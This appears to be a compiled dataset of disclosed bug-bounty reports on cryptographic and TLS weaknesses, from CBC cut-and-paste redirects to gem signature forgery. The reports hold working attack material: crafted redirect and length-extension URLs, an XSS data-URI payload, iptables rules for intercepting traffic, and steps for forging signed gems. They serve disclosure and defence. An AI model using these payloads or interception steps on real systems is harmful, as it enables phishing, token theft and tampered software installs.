@@ -1,0 +1,1324 @@
+===== #126203 · CBC "cut and paste" attack may cause Open Redirect(even XSS)
+   program: uber · bounty: 500.0 · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+Hello, Uber Security Team
+
+I found an vulnerability in Uber URL redirect page.
+
+# Vulnerability
+In page
+```
+http://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa0e40f3acb1e99e66c
+```
+
+parameter "EQ" is an encrypted URL and "Redirect.aspx" will redirect page to url which is decrypted.
+After some trying, it looks like encryted by **CBC mode** and block size is **8**.
+
+And I found an URL 
+```
+https://pages.et.uber.com/hangzhou1year/?uuid=1234
+```
+
+This URL can encrypted itself. For example
+Access
+`https://pages.et.uber.com/hangzhou1year/?uuid=1234`
+and view the source you will see
+```
+https://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bec4638573e1cff2ba6cc032c5986fe5497c86cfaefb22406bd798a7f8312fde3acd3757bd120dfa025d290b1cf9a6e85
+```
+Above is the encrypted result of string `https://pages.et.uber.com/hangzhou1year/?uuid=1234`
+
+
+# Exploiting
+ok, now I can encrypt something by `?uuid=whatever` and decrypt something by `?EQ=whatever`
+
+so I can decrypt all the cipher by `?EQ=whatever` (remember the padding...)
+
+And I can create any cipher by **CBC cut and paste attack**
+For Example, I encrypt `@orange.tw/?` and paste and cipher to bellow URL, when you access URL, you will redirect to orange.tw(my website)
+```
+http://pages.et.uber.com/Redirect.aspx?EQ=5c591a8916642e73ef70dd2c27bd4bad7d810b960a984f390e396861d8a70dfd8d4ad287476f76f106d578f9ace7becffd6e3b312bb4c389315d140317a39050ed569698560fe77404eb8e2f6b2299542477613ae27b43d6d75e133918f7531a2cbea134db7c614a0182342d7079019621af699d14cb1a7cfaa5d14b2982a1a7082d1ff2507b504e68763a7c621e409ef8dd7fe980c48e0664bcb71d4d96523bc9a3bb1c67bf3b0edc8be7c80b4a998d2ce17fd5dd704e741309ec46b0627b0c1924321b894eebbc0128fce2b552959e
+```
+
+I think this vulnerability also can lead to XSS by creating an URL like
+```
+data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+```
+if I have more time doing research ( it's evening in my country now :O )
+
+
+# Attachments
+
+`fake.py` is my Python poc
+`2016-03-26_172607.jpg` decrypt the last block of cipher (%08%08%08%08%08%08%08%08 represented it use PKCS #5 padding)
+
+===== #144782 · CVE-2016-0772 - python: smtplib StartTLS stripping attack
+   program: ibb · bounty: 1000.0 · module: tls-starttls-legacy-protocol · full-body
+--- BODY ---
+python smtplib starttls stripping attack
+
+* affects: (basically all versions of smtplib with starttls support and projects relying on it)
+ * python 2.7.2 - 2.7.11 (dates back ~14 years)
+ * python 3.0 - 3.5.1 (dates back ~7 years)
+
+Python's implementation of `smtplib` fails to raise an exception upon an unexpected response during negotiation of tls via the starttls protocol. This allows a MiTM capable of injecting smtp messages to force smtplib to **silently** abort tls negotiation proceeding to transmit cleartext. (impacting confidentiality)
+For more details see [1]
+potentially affects a variety of open source projects from Django, web2py, ...
+
+initially reported to python PSRT (timeline see [1]) with details, PoC [2] and patch [2]. The patch was accepted and recently landed in python 2.7/3.x [3,4].
+full details and the actual research material that was securely disclosed to Python PSRT will be made available at [1] (currently a preliminary vulnerability note)
+
+the PoC `striptls` [2] is a generic protocol independent tls interception proxy written in python that is also capable of probing for various starttls stripping vectors in smtp, pop3, imap, ftp, xmpp, acap and irc. It is also available via `pip install striptls` (pretty handy for sniffing/proxying proprietary protocols based on top of implicit/explicit tls)
+
+Vendor announcements: [5,6,7]
+
+the preliminary vulnerability note [1] will be updated in accordance with the Python software release scheduled for June 26th.
+
+[1] https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-0772
+[2] https://github.com/tintinweb/striptls
+[3] https://hg.python.org/cpython/rev/d590114c2394
+[4] https://hg.python.org/cpython/rev/b3ce713fb9be
+[5] http://www.openwall.com/lists/oss-security/2016/06/14/9
+[6] https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-0772
+[7] https://access.redhat.com/security/cve/cve-2016-0772
+
+===== #151868 · No Rate Limit In Inviting Similar Contact Multiple Times
+   program: algolia · bounty: 100.0 · module: _adjacent · full-body
+--- BODY ---
+There is not Rate limit in Inviting a similar contact Multiple times 
+See the attachment for confirmation :
+
+===== #166629 · Cross-protocol attack on TLS using SSLv2 (DROWN) (CVE-2016-0800)
+   program: ibb · bounty: None · module: tls-starttls-legacy-protocol · full-body
+--- BODY ---
+General DROWN was responsibly disclosed to the OpenSSL team prior to the public disclosure.
+This OpenSSL blog post, by Viktor Dukhovni and Emilia Käsper, describes the vulnerability:
+https://www.openssl.org/blog/blog/2016/03/01/an-openssl-users-guide-to-drown/
+
+This is probably a good opportunity to again thank everyone who helped with the disclosure process :-)
+
+===== #166634 · SSLv2 doesn't block disabled ciphers (CVE-2015-3197)
+   program: ibb · bounty: None · module: tls-starttls-legacy-protocol · full-body
+--- BODY ---
+This is a DROWN-related issue that essentially circumvented the instructions on how to disable SSLv2 at the time. Its primary effect was that a lot of servers were vulnerable to DROWN even though they thought they had SSLv2 disabled.
+It was reported to OpenSSL and fixed in versions 1.0.2f and 1.0.1r:
+https://www.openssl.org/news/secadv/20160128.txt
+
+(and obviously the DROWN attack itself was reported to OpenSSL, as explained in this OpenSSL blogpost:
+https://www.openssl.org/blog/blog/2016/03/01/an-openssl-users-guide-to-drown/
+
+Thanks!
+
+===== #168538 · Twitter iOS fails to validate server certificate and sends oauth token
+   program: x · bounty: 2100.0 · module: cert-validation-weak-secrets-insecure-channel · full-body
+--- BODY ---
+Twitter on iOS newest two versions (6.62 and 6.62.1) are affected, other versions not tested. Tested independently on two different iPhone 6 with iOS version 9.3.3 and 9.3.5 without Jailbreak. The iPhone were without any mobileconfig profiles installed - *no* we did not install any CA certificate in the CA store of the device. Really stock iPhones. The Twitter app does not check the SSL/TLS certificate of https://api.twitter.com . A transparent proxy setup (eg. burp suite in transparent mode) is sufficient to exploit. Steps to reproduce:
+1. Start Burp or other Proxy software in transparent mode. Setting "Generate CA-signed per-host certificates", which means the CA cert of Burp is used, which is *not* trusted on the iPhones.
+2. Start rogue Wifi access point (eg. on the same machine as burp)
+3. Redirect all incoming HTTPS traffic on the rogue Wifi access point to the transparent proxy. We simply used on Linux:
+iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080
+iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+4. Connect with the iOS device to the Wifi access point
+5. Open Twitter app on iOS
+6. In burp only the calls to api.twitter.com are visible and include sensitive authentication information etc.
+
+This is the information we saw for two different accounts in burp which includes the oauth token etc.:
+
+GET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1
+Host: api.twitter.com
+█████████
+X-Twitter-Client-Version: 6.62
+X-Twitter-Polling: true
+X-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B
+X-Twitter-Client-Language: de
+X-B3-TraceId: cc8ac1aea2ba5628
+x-spdy-bypass: 1
+Accept: */*
+Accept-Language: de
+Accept-Encoding: gzip, deflate
+X-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC
+User-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)
+Connection: close
+X-Twitter-API-Version: 5
+X-Twitter-Client-Limit-Ad-Tracking: 1
+X-Twitter-Client: Twitter-iPhone
+
+
+
+HTTP/1.1 304 Not Modified
+cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
+connection: close
+content-length: 0
+content-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;
+content-type: text/html;charset=utf-8
+date: Thu, 15 Sep 2016 08:33:18 GMT
+expires: Tue, 31 Mar 1981 05:00:00 GMT
+last-modified: Thu, 15 Sep 2016 08:33:18 GMT
+pragma: no-cache
+server: tsa_b
+set-cookie: guest_id=v1%3A147392839826657964; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:33:18 UTC
+status: 304 Not Modified
+strict-transport-security: max-age=631138519
+x-access-level: read-write
+x-client-event-enabled: true
+x-connection-hash: 40e91f874332181942e1454b13ccaa6a
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-rate-limit-limit: 15
+x-rate-limit-remaining: 12
+x-rate-limit-reset: 1473929244
+x-response-time: 29
+x-transaction: cc8ac1aea2ba5628
+x-twitter-response-tags: BouncerExempt
+x-twitter-response-tags: BouncerCompliant
+x-xss-protection: 1; mode=block
+
+
+
+GET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1
+Host: api.twitter.com
+█████████
+X-Twitter-Client-Version: 6.62
+X-Twitter-Polling: true
+X-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B
+X-Twitter-Client-Language: de
+X-B3-TraceId: 796651628eef7eed
+x-spdy-bypass: 1
+Accept: */*
+Accept-Language: de
+Accept-Encoding: gzip, deflate
+X-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC
+User-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)
+Connection: close
+X-Twitter-API-Version: 5
+X-Twitter-Client-Limit-Ad-Tracking: 1
+X-Twitter-Client: Twitter-iPhone
+
+
+
+HTTP/1.1 304 Not Modified
+cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
+connection: close
+content-length: 0
+content-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;
+content-type: text/html;charset=utf-8
+date: Thu, 15 Sep 2016 08:34:36 GMT
+expires: Tue, 31 Mar 1981 05:00:00 GMT
+last-modified: Thu, 15 Sep 2016 08:34:36 GMT
+pragma: no-cache
+server: tsa_b
+set-cookie: guest_id=v1%3A147392847623972314; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:34:36 UTC
+status: 304 Not Modified
+strict-transport-security: max-age=631138519
+x-access-level: read-write
+x-client-event-enabled: true
+x-connection-hash: e980abd0bd35e3bf0b8c693e8a12f636
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-rate-limit-limit: 15
+x-rate-limit-remaining: 11
+x-rate-limit-reset: 1473929244
+x-response-time: 44
+x-transaction: 796651628eef7eed
+x-twitter-response-tags: BouncerExempt
+x-twitter-response-tags: BouncerCompliant
+x-xss-protection: 1; mode=block
+
+===== #170548 · Ruby OpenSSL Library - IV Reuse in GCM Mode
+   program: ruby · bounty: 500.0 · module: _adjacent_unclassified · full-body
+--- BODY ---
+Hello,
+
+An IV reuse bug was discovered in Ruby's OpenSSL library when using
+aes-gcm. When encrypting data with aes-*-gcm, if the IV is set before
+setting the key, the cipher will default to using a static IV. This creates
+a static nonce and since aes-gcm is a stream cipher, this can lead to known
+cryptographic issues.
+
+The documentation does not appear to specify the order of operations when
+setting the key and IV [1]. As an example, see the following insecure code
+snippet below:
+
+Vulnerable Code:
+```
+def encrypt(plaintext)
+    cipher = OpenSSL::Cipher.new('aes-256-gcm')
+    iv = cipher.random_iv # Notice here the IV is set before the key
+    cipher.key = '11111111111111111111111111111111'
+    cipher.auth_data = ""
+    ciphertext = cipher.update(plaintext) + cipher.final
+    tag = cipher.auth_tag
+
+    puts "[+] Encrypting: #{plaintext}"
+    puts "[+] CipherMessage (IV | Tag | Ciphertext): #{bin2hex(iv)} |
+#{bin2hex(tag)} | #{bin2hex(ciphertext)}"
+end
+```
+A developer that uses the code above may incorrectly assume that their code
+is secure from the pitfalls associated with IV reuse in aes-*-gcm, since
+the ‘cipher.random_iv’ method is used. According to the documentation, this
+should generate a random IV each time the encryption method is called.
+
+When the code above is run with the same key and same plaintext message,
+the following results are obtained:
+
+Output:
+```
+# Run 1
+./gcm_encrypt.rb 'This is some secret message.'
+[+] Encrypting: This is some secret message.
+[+] CipherMessage (IV | Tag | Ciphertext): e32594080cca2b37f7d7e968 |
+8c676db7551cf046266252ee776ecaa9 | 81092d16b62902d9985656253891dc
+800a5bb48fb1c4ad0b7bdf6054
+```
+```
+# Run 2
+./gcm_encrypt.rb 'This is some secret message.'
+[+] Encrypting: This is some secret message.
+[+] CipherMessage (IV | Tag | Ciphertext): 431d70714f5e5f876d1c7830 |
+8c676db7551cf046266252ee776ecaa9 | 81092d16b62902d9985656253891dc
+800a5bb48fb1c4ad0b7bdf6054
+```
+Notice that in the output above a unique IV is returned for both runs, but
+with the same ciphertext. This proves that even though the random_iv method
+is called, the code is defaulting to a static IV. If an attacker can
+retrieve multiple ciphertext messages, it is possible to decrypt the
+ciphertexts by applying the same attack one would use in a two-time pad
+(XOR ciphertexts and crib drag).
+
+Next review the following code snippet and output, which depicts a secure
+implementation of the code:
+
+Valid Code:
+```
+def encrypt(plaintext)
+    cipher = OpenSSL::Cipher.new('aes-256-gcm')
+    cipher.key = '11111111111111111111111111111111'
+    iv = cipher.random_iv # Notice here the IV is set after the key
+    cipher.auth_data = ""
+    ciphertext = cipher.update(plaintext) + cipher.final
+    tag = cipher.auth_tag
+
+    puts "[+] Encrypting: #{plaintext}"
+    puts "[+] CipherMessage (IV | Tag | Ciphertext): #{bin2hex(iv)} |
+#{bin2hex(tag)} | #{bin2hex(ciphertext)}"
+end
+```
+Output:
+```
+# Run 1
+./gcm_encrypt.rb 'This is some secret message.'
+[+] Encrypting: This is some secret message.
+[+] CipherMessage (IV | Tag | Ciphertext): 8beb4aa05533e90f4f4eddd3 |
+ea1b015958a9b8bd2aafa61887309caf | 19574a9c9869b92140a57a5fd43a14
+9a5eaa7e5beefdff5d56cc4136
+```
+```
+# Run 2
+./gcm_encrypt.rb 'This is some secret message.'
+[+] Encrypting: This is some secret message.
+[+] CipherMessage (IV | Tag | Ciphertext): 87361b3f1e32291602ac7b40 |
+bce7093daa10cc9d2fad0f2b91e077f2 | 47f9a5ba55631204233ace70f169e6
+65846e877dca11a6e13a659540
+```
+Notice that this time both the IV and ciphertexts are both different for
+the same plaintext. This is the intended result a developer would expect to
+happen when using this library.
+
+Reference:
+[1] https://ruby-doc.org/stdlib-2.0.0/libdoc/openssl/rdoc/OpenSSL/Cipher.html#class-OpenSSL::Cipher-label-Authenticated+Encryption+and+Associated+Data+-28AEAD-29
+
+===== #213437 · Critical vulnerability in JSON Web Encryption (JWE) - RFC 7516 Invalid Curve attack
+   program: ibb · bounty: 1000.0 · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+We found an issue in the JWE specification where it fails to warn the implementers about Invalid Curve attack.
+We found several libraries to be vulnerable :   node-jose, jose2go, Nimbus JOSE+JWT and jose4j and in the process of filing an errata for the RFC.
+We report the vulnerabilities to the maintainers that promptly fixed the issue.
+We also wrote a blog post about it in order to reach the highest number of people potentially vulnerable. You can find the write up in [0,1,2].
+
+[0] http://blog.intothesymmetry.com/2017/03/critical-vulnerability-in-json-web.html
+[1] http://blogs.adobe.com/security/2017/03/critical-vulnerability-uncovered-in-json-encryption.html
+[2] https://auth0.com/blog/critical-vulnerability-in-json-web-encryption/
+
+===== #251572 · Length extension attack leading to HTML injection
+   program: zomato · bounty: 100.0 · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+At the profile setting page where I can set my personal website I found this url:
+*https://www.zomato.com/redirect?u=xxx&t=yyy*
+Where `xxx` is the `url` that we can control and `yyy` is the `hash`. Through out blackbox testing I find out that if md5(`somescret` + `url`) == t then the redirect is allowed. This is vulnable to <https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks>. With this vulnerability I can append what ever I want into the `url` in `u` variable.  <https://www.zomato.com/redirect?u=http%3A//a.c%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%E8%00%00%00%00%00%00%00%3Cstyle%3Ebody%7Bbackground-color%3A%20black%3B%7D%3C/style%3E%3Cmarquee%20bgcolor%3D%23000000%3E%3Cfont%20color%3D%2300FF00%3Eb1t%20%3D%2C%3D%3C/font%3E%3C/marquee%3E&t=cb3efc9cbeb3d7b84dfc5cb2bef5a3c4>. As a result I can inject arbitrary HTML content into your page because of the `Redirecting you to...` message and there is no escaping on this page. At first I was aiming at an `XSS` but your `WAF` blocks all my attemps, a more skilled attacker may be able to bypass it. Because the nullbyte in `url` breaks your `Refresh` header the page won't redirect anymore and display my injected content. Visit the `poc` above and look at the request and response you will have a clearer view of what happened. A correct fix for this would be using a `correct ``HMAC` implementation not just simple `md5(secret+message)`. There is an attachment script below which I used to exploit the vulnerability. You have get <https://github.com/iagox86/hash_extender> to be able to use the script.
+
+===== #275269 · Gem signature forgery
+   program: rubygems · bounty: None · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+# Summary
+
+Inconsistencies in how `gem` processes gem files make it possible to reuse a signature from an existing signed gem and apply it to arbitrary contents. The forged gem will install even with `-P HighSecurity`.
+
+The attached file multi_json-1.12.2.gem is a forged version of the genuine [multi_json-1.12.2.gem](https://rubygems.org/gems/multi_json/versions/1.12.2) gem with faked contents (just a single text file called HACKED). Here is how to check it. You must first trust the original developer's public key.
+```
+$ gem --version
+2.5.2
+$ wget https://raw.githubusercontent.com/intridea/multi_json/master/certs/rwz.pem
+$ gem cert --add rwz.pem
+Added '/CN=pavel/DC=pravosud/DC=com'
+$ gem install --install-dir install -P HighSecurity multi_json-1.12.2.gem
+Successfully installed multi_json-1.12.2
+1 gem installed
+$ ls install/gems/multi_json-1.12.2/
+HACKED
+```
+
+
+# Details
+
+The vulnerability stems from inconsistencies in how `gem` interprets the entries of the tar container. A tar file may contain multiple entries with the same name. When there are two data.tar.gz entries, for example, `gem` will honor the *second* one when verifying the signature, but the *first* one when installing files. The proof of concept gem uses this trick: it prepends an additional data.tar.gz entry to the genuine multi_json-1.12.2.gem. (The attached forge-gem.sh script was used to make it.)
+```
+$ tar tvf multi_json-1.12.2.gem
+-r--r--r-- wheel/wheel     163 2017-10-05 16:05 data.tar.gz
+-r--r--r-- wheel/wheel    1840 2017-09-04 21:51 metadata.gz
+-r--r--r-- wheel/wheel     256 2017-09-04 21:51 metadata.gz.sig
+-r--r--r-- wheel/wheel   16908 2017-09-04 21:51 data.tar.gz
+-r--r--r-- wheel/wheel     256 2017-09-04 21:51 data.tar.gz.sig
+-r--r--r-- wheel/wheel     270 2017-09-04 21:51 checksums.yaml.gz
+-r--r--r-- wheel/wheel     256 2017-09-04 21:51 checksums.yaml.gz.sig
+```
+
+A similar bug affects checksums.yaml.gz: checksums are read from the first such entry, while the signature is verified on the last. This table summarizes the inconsistencies:
+
+| file              | `extract_files` uses | `verify` uses |
+|-------------------|----------------------|---------------|
+| data.tar.gz       | first                | last          |
+| checksums.yaml.gz | first                | last          |
+| metadata.gz       | last                 | last          |
+
+
+## Source code references
+
+Here are the pieces of code that are responsible for the inconsistencies in processing.
+
+[`extract_files`](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/package.rb#L334-L350) takes the *first* data.tar.gz entry:
+```
+  def extract_files destination_dir, pattern = "*"
+    verify unless @spec
+
+    FileUtils.mkdir_p destination_dir
+
+    @gem.with_read_io do |io|
+      reader = Gem::Package::TarReader.new io
+
+      reader.each do |entry|
+        next unless entry.full_name == 'data.tar.gz'
+
+        extract_tar_gz entry, destination_dir, pattern
+
+        return # ignore further entries
+      end
+    end
+  end
+```
+
+[`read_checksums`](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/package.rb#L466-L474) [seeks](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/package/tar_reader.rb#L109-L119) to the *first* checksums.yaml.gz entry:
+```
+  def read_checksums gem
+    Gem.load_yaml
+
+    @checksums = gem.seek 'checksums.yaml.gz' do |entry|
+      Zlib::GzipReader.wrap entry do |gz_io|
+        YAML.load gz_io.read
+      end
+    end
+  end
+```
+
+[`verify_files`](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/package.rb#L593-L606) and [`verify_entry`](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/package.rb#L566-L588) iterate over all entries in the tar file, filling in `@signatures` and `@digests`. In the case of entries with duplicate names, it overwrites previous values, meaning that the *last* result wins. `verify_entry` also handles metadata.gz, calling [`load_spec`](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/package.rb#L436-L450) afresh each time:
+```
+  def verify_entry entry
+    file_name = entry.full_name
+    @files << file_name
+
+    case file_name
+    when /\.sig$/ then
+      @signatures[$`] = entry.read if @security_policy
+      return
+    else
+      digest entry
+    end
+
+    case file_name
+    when /^metadata(.gz)?$/ then
+      load_spec entry
+    when 'data.tar.gz' then
+      verify_gz entry
+    end
+  rescue => e
+    message = "package is corrupt, exception while verifying: " +
+              "#{e.message} (#{e.class})"
+    raise Gem::Package::FormatError.new message, @gem
+  end
+```
+[`verify_checksums`](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/package.rb#L548-L561) and [`verify_signatures`](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/security/policy.rb#L283-L291) operate only on the precomputed `@checksums`, `@signatures`, and `@digests`.
+
+Incidentally, [`get_metadata`](https://github.com/rubygems/rubygems/blob/v2.6.13/lib/rubygems/commands/unpack_command.rb#L161-L177), used by the `unpack` command, has its own extractor for metadata.gz, but it happens to grab the last entry, just like `verify_files`.
+
+
+# Mitigation
+
+The attached patch 0001-Add-tests-that-Gem-Package-verify-checks-duplicate-f.patch adds two new tests (both currently failing) that check signature verification when bogus files come before or after the genuine files.
+
+The essential mitigation is to ensure that there is no ambiguity when processing a tar file that has multiple entries for the same file name. E.g., "data.tar.gz" must refer to one and only one entry in the tar file. One way to do it would be to set a policy in the code: e.g., last entry always wins (which would be consistent with the `tar` command). But that would be hard to enforce, especially in new code going forward. Another way would be not to permit duplicate entries; e.g., `verify_entry` could check whenever it is about to overwrite something in `@signatures`, `@digests`, or `@spec`, and return an error. This needs some care, as metadata and metadata.gz are both processed equivalently. It is possible, using symlinks, to create entries that effectively point to the same file, even though the paths differ; e.g.:
+```
+data.tar.gz
+dir/ -> ..
+dir/data.tar.gz
+```
+But this shouldn't be a problem for `gem`, as long as it continues to use strict string equality with unadorned paths like `"data.tar.gz"`.
+
+Even when this bug is fixed, a weaker form of signature forgery is possible. There is nothing in a gem file that binds data.tar.gz and metadata.gz together: they are signed independently. It is possible to mix and match files from different signed gems. Suppose a signed gem example-1.0 has a security vulnerability, and the authors release a new signed update example-1.1. Someone (perhaps a malicious rubygems.org admin) could forge a gem containing data.tar.gz from example-1.0 and metadata.gz from example-1.1. Users would think they are running the updated code, but they are still running the old vulnerable code. Fixing this weaker form of forgery seems like it would require a redesign of the signature format. Ideally, the signature would be over the entire gem, and verified before any unpacking.
+
+It seems that not many people are sign their gems or verify signatures. For most users the possibility of signature forgery doesn't put them at additional risk beyond the (already risky) status quo. The flaw affects only those users who use the `MediumSecurity` or `HighSecurity` profiles.
+
+
+# Attachments
+
+- **multi_json-1.12.2.gem** is a gem with a forged signature.
+- **0001-Add-tests-that-Gem-Package-verify-checks-duplicate-f.patch** adds tests for specific instances of gem files that contain multiple entries with the same name.
+- **forge-gem.sh** takes an existing signed gem and produces a forged gem containing an arbitrary data.tar.gz file.
+
+How to run forge-gem.sh:
+```
+$ gem fetch multi_json
+$ mkdir orig
+$ mv multi_json-1.12.2.gem orig/
+$ echo hacked > HACKED
+$ tar czf data.tar.gz HACKED
+$ ./forge-gem.sh orig/multi_json-1.12.2.gem data.tar.gz forged.gem
+```
+Be aware that if the original multi_json-1.12.2.gem and the new forged.gem are both in the same directory, then `gem install ./forged.gem` will—for some reason—install multi_json-1.12.2.gem instead. You have to hide the original file in another directory first.
+
+===== #277534 · Timing Attack in Google Authenticator - Per User Prompt
+   program: iandunn-projects · bounty: 25.0 · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+*Google Authenticator - Per User Prompt* contains a timing attack vulnerability in how it validates the application password for a user account.
+
+```
+if ( sha1( $attempted_password_plaintext ) === $valid_password_hash || wp_check_password( $attempted_password_plaintext, $valid_password_hash ) ) {
+	$this->is_using_application_password = true;
+	return $user;
+}
+```
+__wp-content/plugins/google-authenticator-per-user-prompt/google-authenticator-per-user-prompt.php__
+
+As the above code runs on the `authenticate` hook, and uses a strict equality check, it's possible to brute force an application password using a timing attack and gain access to the account, without needing the real password or even a valid OTP token.
+
+The plugin adds two `authenticate` hooks, one for the above app password check, then a second that does the OTP validation stuff, but *only* if the not using an app password. This means that we only need the app password to login, which we can brute force via timing attack.
+
+```
+if ( 'enabled' == trim( get_user_option( 'googleauthenticator_enabled', $user->ID ) ) && ! $this->is_using_application_password ) {
+    // ... OTP stuff
+}
+```
+
+The correct way to check the app password is to use `hash_equals()`, which is safe from timing attacks - https://secure.php.net/manual/en/function.hash-equals.php
+
+Example:
+
+```
+if ( hash_equals( sha1( $attempted_password_plaintext ), $valid_password_hash ) || ... {
+```
+
+It's worth noting that `hash_equals()` is already in use in `Google_Authenticator_Per_User_Prompt::verify_login_nonce()`.
+
+All accounts that have an app password enabled (which is not by default) are vulnerable to takeover using this method.
+
+===== #288966 · POODLE SSLv3 bug on multiple twitter smtp servers (mx3.twitter.com,199.59.148.204,199.16.156.108 and 199.59.148.204)
+   program: x · bounty: None · module: tls-starttls-legacy-protocol · full-body
+--- BODY ---
+**Summary:** POODLE SSLv3 bug on multiple twitter smtp servers
+
+**Description:** CVE-2014-3566: The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other products, uses nondeterministic CBC padding, which makes it easier for man-in-the-middle attackers to obtain cleartext data via a padding-oracle attack, aka the "POODLE" issue.
+
+
+## Steps To Reproduce:
+
+Hi Twitter Sec team here is the POC
+
+  1. get a nmap installation and twitter_smtp_ssl_servers.txt file (attached)  
+  2. run this command :
+"nmap -sV --version-light -Pn --script ssl-poodle -p 25 -iL twitter_smtp_ssl_servers.txt | grep -B 5 VULNERABLE"
+  3. See the results 
+
+## Supporting Material/References:
+
+  * An output screentshot  and the twitter_smtp_ssl_servers.txt are attached.
+
+===== #327674 · Invitation reminder emails contain insecure links
+   program: slack · bounty: 350.0 · module: cert-validation-weak-secrets-insecure-channel · full-body
+--- BODY ---
+If one gets invited to a slack channel and does not act upon the invitation a while later a reminder email is sent.
+
+The links in these reminders are http links. Excerpt from the mail:
+----------------------
+Don’t miss out — come join the conversation!
+
+Join Now
+http://click.email.slack-core.com/?qs=[id removed]
+----------------------
+
+This poses an unnecessary risk that the connections can be intercepted and redirected by an attacker.
+
+This is particularly surprising and unnecessary as:
+1. The links directly redirect to an https URL.
+2. The initial invitation mail contains no such indirect link, it directly links to https.
+
+## Impact
+
+Attackers that are in the same network as a person receiving an invitation reminder mail can do a man in the middle attack and redirect the victim to a forget fake slack webpage.
+
+===== #435648 · TOTP Key is shorter than RFC 4226 recommended minimum
+   program: phabricator · bounty: 300.0 · module: cert-validation-weak-secrets-insecure-channel · full-body
+--- BODY ---
+mongoose
+
+**Observed Behavior:**
+When creating a TOTP secret a 16 character base32 encoded string is presented to the user.
+
+**Expected Behavior:**
+I would expect a 32 character base32 secret to be presented.
+The RFC recommends 160 bits of entropy, which is 32 character x 5 bits per character in a base32 string.
+RFC 4226 Section 4 Requirement 6 -  128 bit minimum, 160 recommended.
+
+**Phabricator Version:**
+phabricator
+
+24a061f844958cc22d6f4874535b57574a6c13c3 (Fri, Nov 2)
+
+arcanist
+
+83661809e532c3fe444a8bf7c7d6936e6377691b (Fri, Oct 26)
+
+phutil
+
+cf96fd681e7d35ad21c7aaaa0bd1869124e377ef (Thu, Nov 1)
+
+diff
+
+3.6 at /usr/bin/diff
+
+git
+
+2.19.1 at /usr/bin/git
+
+hg
+
+Not Available
+
+pygmentize
+
